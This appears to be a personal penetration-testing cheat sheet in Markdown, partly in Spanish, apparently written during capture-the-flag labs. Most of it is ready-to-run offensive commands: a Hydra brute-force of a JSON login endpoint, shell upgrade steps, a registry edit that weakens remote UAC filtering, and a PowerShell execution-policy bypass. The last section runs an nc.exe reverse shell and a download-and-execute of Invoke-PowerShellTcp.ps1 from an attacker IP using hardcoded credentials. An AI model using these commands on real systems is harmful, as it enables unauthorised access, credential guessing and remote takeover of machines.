# General

## Herramientas

### Hydra

`hydra -l <USER> -p <PASSWORD> <IP_ADDRESS> http-post-form "<LOGIN_PAGE>:<REQUEST_BODY>:<ERROR_MESSAGE>"`

##### JSON Payload

`hydra -l "root@dasith.works" -P "/usr/share/wordlists/rockyou.txt" -s 3000 10.129.244.81 http-post-form "/api/user/login:{\"email\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:S=Password is wrong:H=content-type: application/json"`

## TTY

```
Ctrl + z
stty raw -echo
fg + enter
enter
export TERM=xterm
```

```
which python[3]
python[3] -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
# In Kali
stty -a # Notice number of rows and columns
stty raw -echo && fg
# On target system
reset
stty rows xx
stty columns yy
export TERM=xterm-256color
```

# Proxy debugging

TODO: Agregar comandos de shellhacks.com para redireccionar todo el tráfico de la consola a burpsuite

# Windows

## Crackmapexec `(Pwn3d!)`

`cmd.exe /c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f`

## Powershell

### Bypass de execution policy

```powershell
powerShell.exe -ExecutionPolicy Bypass .\script.ps1
```

Refs: https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/

### Invoke command providing credentials

```powershell
$userName = 'WORKGROUP\Hector'
$userPassword = 'l33th4x0rhector'
$secStringPassword = ConvertTo-SecureString $userPassword -AsPlainText -Force
$credObject = New-Object System.Management.Automation.PSCredential ($userName, $secStringPassword)
# ComputerName obtenida de los comandos: 
hostname
$env:COMPUTERNAME
[Environment]::MachineName

Invoke-Command -ComputerName Fidelity -Credential $credObject -ScriptBlock {C:\Windows\Temp\nc.exe -e cmd.exe 10.10.14.16 4321}

Start-Process -FilePath 'powershell' -argumentlist "IEX(New-Object Net.webClient).downloadString('http://10.10.14.16/Invoke-PowerShellTcp.ps1')" -Credential $credObject
```